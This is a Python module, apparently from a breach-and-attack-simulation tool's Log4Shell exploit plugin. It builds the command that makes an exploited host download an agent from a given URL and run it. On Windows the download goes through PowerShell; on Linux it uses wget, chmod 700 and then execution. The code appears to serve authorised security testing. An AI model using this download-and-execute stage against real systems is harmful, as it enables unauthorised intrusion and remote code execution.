from pathlib import PurePosixPath, PureWindowsPath

from agentpluginapi import (
    DropperExecutionMode,
    IAgentCommandBuilderFactory,
    ILinuxAgentCommandBuilder,
    IWindowsAgentCommandBuilder,
    LinuxDownloadMethod,
    LinuxDownloadOptions,
    LinuxRunOptions,
    LinuxSetPermissionsOptions,
    TargetHost,
    WindowsDownloadMethod,
    WindowsDownloadOptions,
    WindowsRunOptions,
    WindowsShell,
)
from monkeytypes import OperatingSystem
from plugintoolbox import get_agent_dst_path


def build_log4shell_command(
    target_host: TargetHost,
    agent_download_url: str,
    agent_command_builder_factory: IAgentCommandBuilderFactory,
) -> str:
    agent_destination_path = get_agent_dst_path(target_host)

    if target_host.operating_system in [
        OperatingSystem.WINDOWS,
        None,  # Based on a quick Shodan search, tomcat seems to be
        # the most popular service out of the three that we have,
        # and is mostly deployed on Windows.
        # If the target host's OS is unknown, default to Windows.
    ]:
        windows_agent_command_builder = (
            agent_command_builder_factory.create_windows_agent_command_builder()
        )
        return _build_windows_log4shell_command(
            PureWindowsPath(agent_destination_path),
            agent_download_url,
            windows_agent_command_builder,
        )
    linux_agent_command_builder = agent_command_builder_factory.create_linux_agent_command_builder()
    return _build_linux_log4shell_command(
        PurePosixPath(agent_destination_path), agent_download_url, linux_agent_command_builder
    )


def _build_windows_log4shell_command(
    agent_destination_path: PureWindowsPath,
    agent_download_url: str,
    agent_command_builder: IWindowsAgentCommandBuilder,
) -> str:
    download_options = WindowsDownloadOptions(
        agent_destination_path=agent_destination_path,
        download_method=WindowsDownloadMethod.WEB_REQUEST,
        download_url=agent_download_url,
    )
    run_options = WindowsRunOptions(
        agent_destination_path=agent_destination_path,
        dropper_execution_mode=DropperExecutionMode.DROPPER,
        shell=WindowsShell.POWERSHELL,
    )
    agent_command_builder.build_download_command(download_options)
    agent_command_builder.build_run_command(run_options)
    return agent_command_builder.get_command()


def _build_linux_log4shell_command(
    agent_destination_path: PurePosixPath,
    agent_download_url: str,
    agent_command_builder: ILinuxAgentCommandBuilder,
) -> str:
    download_options = LinuxDownloadOptions(
        agent_destination_path=agent_destination_path,
        download_method=LinuxDownloadMethod.WGET,
        download_url=agent_download_url,
    )

    permission_options = LinuxSetPermissionsOptions(
        agent_destination_path=agent_destination_path, permissions=0o700
    )

    run_options = LinuxRunOptions(
        agent_destination_path=agent_destination_path,
        dropper_execution_mode=DropperExecutionMode.DROPPER,
    )

    agent_command_builder.build_download_command(download_options)
    agent_command_builder.build_set_permissions_command(permission_options)
    agent_command_builder.build_run_command(run_options)

    return agent_command_builder.get_command()
